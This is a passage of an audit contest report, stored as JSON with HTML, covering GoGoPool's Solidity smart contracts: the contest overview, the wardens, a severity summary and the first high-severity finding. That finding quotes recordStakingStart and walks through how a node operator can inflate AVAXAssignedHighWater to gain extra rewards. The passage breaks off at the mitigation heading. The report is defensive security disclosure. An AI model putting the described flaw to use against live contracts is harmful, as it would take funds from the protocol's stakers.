{
  "circa": {
    "title": "GoGoPool contest",
    "sponsor": "GoGoPool",
    "slug": "2022-12-gogopool",
    "date": "2023-03-21",
    "findings": "https://github.com/code-423n4/2022-12-gogopool-findings/issues",
    "contest": 194
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the GoGoPool smart contract system written in Solidity. The audit contest took place between December 15—January 3 2023.</p>\n<p>Following the C4 audit contest, 3 wardens (<a href=\"https://twitter.com/hansfriese\">hansfriese</a>, RaymondFam, and <a href=\"https://twitter.com/Xc1008Cu\">ladboy233</a>) reviewed the mitigations for all identified issues; the mitigation review report is appended below the audit contest report.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>114 Wardens contributed reports to the GoGoPool contest:</p>\n<ol>\n<li><a href=\"https://twitter.com/0kage_eth\">0Kage</a></li>\n<li><a href=\"https://twitter.com/3xJanx2009\">0x73696d616f</a></li>\n<li>0xLad</li>\n<li><a href=\"https://twitter.com/0xNazgul\">0xNazgul</a></li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li>0xbepresent</li>\n<li>0xc0ffEE</li>\n<li><a href=\"https://twitter.com/0xdeadbeef____\">0xdeadbeef0x</a></li>\n<li>0xhunter</li>\n<li>0xmint</li>\n<li><a href=\"https://twitter.com/akshaysrivastv\">AkshaySrivastav</a></li>\n<li><a href=\"https://twitter.com/_Allarious\">Allarious</a></li>\n<li>Arbor-Finance (namaskar and bookland)</li>\n<li>Atarpara</li>\n<li><a href=\"https://github.com/Aymen1001\">Aymen0909</a></li>\n<li>Bnke0x0</li>\n<li>Breeje</li>\n<li><a href=\"https://twitter.com/0xch301\">Ch_301</a></li>\n<li><a href=\"https://twitter.com/_Czar102\">Czar102</a></li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n<li><a href=\"https://twitter.com/farazsth98\">Faith</a></li>\n<li><a href=\"https://franfran.dev/\">Franfran</a></li>\n<li>HE1M</li>\n<li>HollaDieWaldfee</li>\n<li>IllIllI</li>\n<li><a href=\"https://jeiwan.net\">Jeiwan</a></li>\n<li>Josiah</li>\n<li>KmanOfficial</li>\n<li>Lirios</li>\n<li><a href=\"https://twitter.com/manboy_eth\">Manboy</a></li>\n<li>Matin</li>\n<li>NoamYakov</li>\n<li><a href=\"https://twitter.com/Nyksx__\">Nyx</a></li>\n<li>PaludoX0</li>\n<li><a href=\"https://twitter.com/adigunq_adigun\">Qeew</a></li>\n<li>RaymondFam</li>\n<li>Rolezn</li>\n<li>SEVEN</li>\n<li>Saintcode_</li>\n<li><a href=\"@sam_gmk\">SamGMK</a></li>\n<li>SmartSek (0xDjango and hake)</li>\n<li><a href=\"https://mobile.twitter.com/tomj_bb\">TomJ</a></li>\n<li>V_B (Barichek and vlad_bochok)</li>\n<li>WatchDogs</li>\n<li>__141345__</li>\n<li><a href=\"https://github.com/romeroadrian\">adriro</a></li>\n<li>ak1</li>\n<li>ast3ros</li>\n<li><a href=\"https://twitter.com/agfviggiano\">aviggiano</a></li>\n<li><a href=\"https://twitter.com/eth_lines\">betweenETHlines</a></li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li>brgltd</li>\n<li>btk</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li><a href=\"https://twitter.com/camdenincrypto\">camdengrieh</a></li>\n<li>caventa</li>\n<li>cccz</li>\n<li>chaduke</li>\n<li>ck</li>\n<li>clems4ever</li>\n<li><a href=\"https://twitter.com/codeIslight\">codeislight</a></li>\n<li>cozzetti</li>\n<li>cryptonue</li>\n<li>cryptostellar5</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li><a href=\"https://twitter.com/daniel_yamagata\">danyams</a></li>\n<li>datapunk</li>\n<li>dic0de</li>\n<li>eierina</li>\n<li>enckrish</li>\n<li><a href=\"https://twitter.com/father0fBl0cks\">fatherOfBlocks</a></li>\n<li>fs0c</li>\n<li>gz627</li>\n<li><a href=\"https://twitter.com/hansfriese\">hansfriese</a></li>\n<li>hihen</li>\n<li>imare</li>\n<li>immeas</li>\n<li>jadezti</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li>kaliberpoziomka8552</li>\n<li>kartkhira</li>\n<li><a href=\"https://twitter.com/Kiki_developer\">kiki_dev</a></li>\n<li>koxuan</li>\n<li><a href=\"https://twitter.com/Xc1008Cu\">ladboy233</a></li>\n<li>latt1ce</li>\n<li>lukris02</li>\n<li>mert_eren</li>\n<li>minhtrng</li>\n<li>mookimgo</li>\n<li><a href=\"https://twitter.com/nadin20678790\">nadin</a></li>\n<li>nameruse</li>\n<li>neumo</li>\n<li><a href=\"https://twitter.com/0xnogo\">nogo</a></li>\n<li><a href=\"https://twitter.com/SolidityDev\">pauliax</a></li>\n<li><a href=\"https://twitter.com/peak_bolt\">peakbolt</a></li>\n<li>peanuts</li>\n<li>peritoflores</li>\n<li>rvierdiiev</li>\n<li>sces60107</li>\n<li>shark</li>\n<li>simon135</li>\n<li>sk8erboy</li>\n<li>slowmoses</li>\n<li><a href=\"https://twitter.com/Stealthyzzzz\">stealthyz</a></li>\n<li><a href=\"https://twitter.com/harshit16024263\">supernova</a></li>\n<li>tonisives</li>\n<li>unforgiven</li>\n<li>wagmi</li>\n<li>wallstreetvilkas</li>\n<li>yixxas</li>\n<li>yongskiws</li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/judge\">Alex the Entreprenerd</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 28 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 22 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 15 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 12 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-12-gogopool\">C4 GoGoPool contest repository</a>, and is composed of 18 smart contracts written in the Solidity programming language and includes 2,040 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-6\" style=\"position:relative;\"><a href=\"#high-risk-findings-6\" aria-label=\"high risk findings 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (6)</h1>\n<h2 id=\"h-01-avax-assigned-high-water-is-updated-incorrectly\" style=\"position:relative;\"><a href=\"#h-01-avax-assigned-high-water-is-updated-incorrectly\" aria-label=\"h 01 avax assigned high water is updated incorrectly permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/566\">[H-01] AVAX Assigned High Water is updated incorrectly</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/566\">hansfriese</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/827\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/641\">wagmi</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/452\">betweenETHlines</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/401\">Allarious</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/266\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/193\">chaduke</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/aec9928d8bdce8a5a4efe45f54c39d4fc7313731/contracts/contract/MinipoolManager.sol#L374\">contracts/contract/MinipoolManager.sol#L374</a></p>\n<p>Node operators can manipulate the assigned high water to be higher than the actual.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The protocol rewards node operators according to the <code>AVAXAssignedHighWater</code> that is the maximum amount assigned to the specific staker during the reward cycle.</p>\n<p>In the function <code>MinipoolManager.recordStakingStart()</code>, the <code>AVAXAssignedHighWater</code> is updated as below.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">MinipoolManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">349</span><span class=\"mtk1\">: \t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">recordStakingStart</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">350: \t\t</span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">nodeID</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">351: \t\t</span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk10\">txID</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">352: \t\t</span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">startTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">353</span><span class=\"mtk1\">: \t) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">354</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">onlyValidMultisig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">355</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk11\">requireValidStateTransition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MinipoolStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Staking</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">356</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">startTime</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">357</span><span class=\"mtk1\">: \t\t\t</span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidStartTime</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">358</span><span class=\"mtk1\">: \t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">359</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">360</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.status&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MinipoolStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Staking</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">361</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk11\">setBytes32</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.txID&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">txID</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">362</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.startTime&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">363</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">364</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk3\">// If this is the first of many cycles, set the initialStartTime</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">365</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initialStartTime</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.initialStartTime&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">366</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">initialStartTime</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">367</span><span class=\"mtk1\">: \t\t\t</span><span class=\"mtk11\">setUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.initialStartTime&quot;</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">startTime</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">368</span><span class=\"mtk1\">: \t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">369</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">370</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.owner&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">371</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getUint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;minipool.item&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">minipoolIndex</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;.avaxLiquidStakerAmt&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">372</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">Staking</span><span class=\"mtk1\"> </span><span class=\"mtk12\">staking</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Staking</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getContractAddress</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Staking&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">373</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXAssignedHighWater</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) &lt; </span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAVAXAssigned</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">374</span><span class=\"mtk1\">: \t\t\t</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseAVAXAssignedHighWater</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">avaxLiquidStakerAmt</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit wrong</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">375</span><span class=\"mtk1\">: \t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">376</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">377</span><span class=\"mtk1\">: \t\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MinipoolStatusChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MinipoolStatus</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Staking</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">378</span><span class=\"mtk1\">: \t}</span></span></span></code></pre>\n<p>In the line #373, if the current assigned AVAX is greater than the owner’s <code>AVAXAssignedHighWater</code>, it is increased by <code>avaxLiquidStakerAmt</code>.\nBut this is supposed to be updated to <code>staking.getAVAXAssigned(owner)</code> rather than being increased by the amount.</p>\n<p>Example:\nThe node operator creates a minipool with 1000AVAX via <code>createMinipool(nodeID, 2 weeks, delegationFee, 1000*1e18)</code>.<br>\nOn creation, the assigned AVAX for the operator will be 1000AVAX.<br>\nIf the Rialtor calls <code>recordStakingStart()</code>, <code>AVAXAssignedHighWater</code> will be updated to 1000AVAX.\nAfter the validation finishes, the operator creates another minipool with 1500AVAX this time. Then on <code>recordStakingStart()</code>, <code>AVAXAssignedHighWater</code> will be updated to 2500AVAX by increasing 1500AVAX because the current assigned AVAX is 1500AVAX which is higher than the current <code>AVAXAssignedHighWater=1000AVAX</code>.<br>\nThis is wrong because the actual highest assigned amount is 1500AVAX.<br>\nNote that <code>AVAXAssignedHighWater</code> is reset only through the function <code>calculateAndDistributeRewards</code> which can be called after <code>RewardsCycleSeconds=28 days</code>.</p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path 